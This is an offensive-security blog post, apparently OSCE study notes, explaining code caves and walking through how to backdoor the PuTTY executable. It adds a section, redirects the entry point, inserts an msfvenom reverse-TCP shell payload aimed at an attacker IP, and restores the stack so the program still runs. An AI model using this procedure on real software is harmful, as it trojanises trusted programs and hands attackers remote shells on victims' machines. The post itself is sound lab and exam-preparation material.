---
title:  "Backdooring Portable Executables (PE)"
date: 2020-05-22 15:11:37 -0400
categories: [Offensive Security, OSCE]
tags: [osce, exploit, devlopment, Windows, backdoor, shellcode]
---
### Summary

In this section of my I will be covering the topic of backdooring executables using shellcode and code caves.

### Code Caves
#### Intro
Many people may have never heard about code caves unless you are familiar with area of Reverse Engineering. So I can help explain this terminology in laymen terms. Essentially a "code cave" is a section in the applications executable that has an allocated section for certain code to run then to return back to the area of the application where the program execution had previously left off at when it was clicked on or executed. Usually a code cave has malicious code to run a command on the victims machine or to make a connection back to the attacker.

#### Why Code Caves?

In simple terms you can think a code cave as a function call... except for a few minor differences. So you may ask if a code cave is so similar to a function then why do we need it? I think codeproject.com answered this question very well so here is a snippet:

> The reason we need codecaves is because source code is rarely available to modify any given program. As a result, we have to physically (or virtually) modify the executable at an assembly level to make changes. 

But you may ask why would you want to modify a pre-existing application? If there is a instance when a company wants you to update an existing software, but no longer has the source code for the product then code caves may be a solution.
In the image belwo we can see what a normal execution flow would look like. The program would execute the steps in order A,B, then C


<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave1.png" style="width: 25%" >

If we introduce a code cave as seen below the execution flow will change to the following order A, D, B, then C. If you notice in the photo the the relation to where the code cave is place in the application isn't really explained, but will be covered later.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave2.png" style="width: 25%" >


No that we are a little familiar with how code caves work theoretically we can begin to explain the more detailed aspects such as the location of the code cave. A code cave can either be placed inside the process space for the application or in a loaded DLL that is called upon in the executable. When a code cave is placed in the executable it is usually codded inline to a location that is unused by the application as seen in the image below. 

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave3.png" style="width: 25%" >

The advantages to is that its fast to implement using a disassembler to modify the executable such as OllyDbg. Using something like OllyDbg you can modify the application and save the changes and distribute the executable. Not only is it fast, but it is also easy to debug or test. Using a debugger you can set breakpoints right before and after the code cave is executed to ensure the code cave is being executed and continuing with the proper execution flow. There are some disadvantages to using a code cave within an executable is that since you have to add the code directly to the file it will thus increase the size of the file. This can throw off some AV or someone who is comparing the checksums of the file with the distributor checksum value. Also there may be a possibility that there is a limited space in the executable that can be used for the code cave. It may also be hard to find code to overwrite and if you aren't careful this can cause the program instability. In addition in order to add the code cave to the executable we will have to code in assembly since we modifying the application directly where we don't have access to the source code.

There is a second option and that is to implement a code cave through a DLL or library that is called upon in the application. The execution flow will change in this instance since the program execution will have to leave the program module to an external module (DLL/Library) as shown below. 

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave4.png" style="width: 25%" >

There are also advantages and disadvantages to adding a code cave in a DLL. The advantages to developing a code cave in a separate DLL is that you wont have to use lower level programming language such as assembly to implement the code cave. This allows the developer of the code cave more control over and use of more complicated logic. There are also some disadvantages to implementing a code cave in a DLL in a EXE is the amount of time it takes to implement. Another big issue is that it's harder to debug and test since its using a DLL.

### Code Cave Resources

- https://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves#Introduction0


### Backdooring Portable Executable (PE) Demo

Now that we know the theory behind code caves and advantages and disadvantages we can begin to put that theory into practice and backdoor a PE. For this demo I am using a Windows 10 64 bit machine that is hosted on my Proxmox Server with the following specs below.

- Windows 10 64 Bit
- 8 Gb of Ram
- 4 Cores
- 50 Gb Hard Drive

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/proxmox.png" style="width: 75%" >


I have also used Remote Desktop for ease of use.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/Desktop.png" style="width: 75%" >

#### Tools
The Tools that we will be using to backdoor the PE is listed below.

- Kali 
  - Metasploit -> msfvenom
- Windows 10  
  - [LordPE](http://woodmann.com/collaborative/tools/index.php/LordPE)
  - Vulnerable PE -> [PuTTY version 0.66](https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.66.html)
  - Immunity Debugger

#### Demo

You can use any debugger such as OllyDbg or WinDbg, but coming from the OSCP PWK they teach you to use Immunity Debugger. First we want download the portable executable that we will adding our shellcode into. For this example I'm gonna use PuTTY 0.66

Open LordPE and click on PE editor. Once you have opened putty in the PE Editor click on "Sections" button and you should get a new window similar to below.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo1.png" style="width: 75%" >

Click on one of the sections then right click then click on "add section header". A new section should appear at the bottom of the list called ".NewSec" you want right click on that and click "edit section header". First we want to change the name to ".cave" then we want to change the values of the Virtual Size and the Raw Size to 1000. This space will be used for our shellcode and extra instructions. Then click OK, close the PE editor, save the file, and close LordPE. Now open PuTTY in the hex editor HxD and scroll to the bottom of the file. Then click edit and insert 1000 bytes and save the file and close. This ensures that our code cave has enough space for our shellcode and any other instructions we need to add.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo2.png" style="width: 75%" >

Now open PuTTY in Immunity Debugger and copy the first few instructions and place it in a text file for later. We will use these instructions to go back to our normal execution once we have executed our shellcode. Back in Immunity Debugger you want to view the memory map and copy the address of our code cave as shown below.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo3.png" style="width: 75%" >

The address is *00484000* now go back to the main thread and change the first instruction to jump to our code cave.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo4.png" style="width: 75%" >

Then highlight the changes and right click and copy to executable and save the file to a new file called "putty1.exe".

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo5.png" style="width: 75%" >

 Then open that file in Immunity Debugger again and hit F7 to step into the code cave.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo6.png" style="width: 75%" >

Before we begin to add our shellcode we need to save the state of the registers using the *PUSHAD* and *PUSHFD* instructions and place them at the top of our code cave. You can find more info about these instruction here https://en.wikipedia.org/wiki/X86_instruction_listings. Now we want to generate our shellcode using the command below.

>  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.7.32 LPORT=443 -f hex -o shellcode.txt

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/Shellcode.png" style="width: 75%" >

Now copy the hex and go back to Immunity Debugger and paste it below the *PUSHAD* and *PUSHFD* instructions.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo8.png" style="width: 75%" >

After a few tries of backdooring putty and getting a shell it would never jump back to its normal execution flow. Through some research I have found out that the instruction *DEC ESI* will decrement the ESI register by 1, thus resulting in the ESI being equal to 00000000. The PUSH ESI pushes it to the stack, at this point that value is FFFF FFFF or -1. Finally INC ESI brings it back to 0000 0000 again. That FFFF FFFF later gets passed to the WaitForSingleObject function. If you don't want to push -1 to the stack then you can replace DEC ESI and PUSH ESI with NOPS. 

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/IDK2.png" style="width: 75%" >

Now we need to highlight our changes and save the changes to a file that will be renamed to "putty2.exe". Then we want to open our new file in Immunity Debugger and jump back to the code cave. Then set a breakpoint on the instruction after the *PUSHAD* and *PUSHFD* instruction and copy the ESP register and paste it in the text file for now. 

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo9.png" style="width: 75%" >

As you can see the ESP register is *0019FF50*. Then Set a breakpoint at the end of the shellcode instructions. Next we want to open a netcat listener on our kali machine to catch the shell.

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo10.png" style="width: 75%" >

Then go back to Immunity Debugger and run the program. GREAT WE HAVE A SHELL!

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo11.png" style="width: 75%" >

Not so fast we still need to align the ESP register. So copy the ESP register again. In this case the ESP register is *0019FD4C*. Now we need to align the stack. 

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo12.png" style="width: 75%" >

Before execution of our shellcode the ESP had a value of *0019FF50* and after the execution of the shellcode it had a value of *0019FD4C* to get back to *0019FF50* we need to find the offset and add that to our ESP.

> *0019FF50* - *0019FD4C* = 204

Since we want to continue with our execution flow we need to change the last instruction to a *NOP* and restore the registers to its previous state and continue with the execution flow. Next we have to realign the ESP by adding 204 to our ESP register. Then we need to add *POPFD* and *POPAD* after our *ADD ESP, 204* instruction. Finally we will have to paste in the instructions we copied at the beginning of the portable executable to return to its normal execution flow. 

<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo13.png" style="width: 75%" >

Then highlight the changes and save that to a new executable we will call putty3.exe. This will be our final backdoored portable executable and as you can see if we click on putty3.exe it gives us a shell and runs the program as intended.
<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo11.png" style="width: 75%" >
<img src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo14.png" style="width: 75%" >

Just to note that this an old method that is now caught be antivirus to in order to get around this we will have to have Windows Defender turned off on our VM to play with our backdoored portable executable.

#### Resources

- https://sector876.blogspot.com/2013/03/backdooring-pe-files-part-1.html
- https://sector876.blogspot.com/2013/03/backdooring-pe-files-part-2.html
- https://ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode
- https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/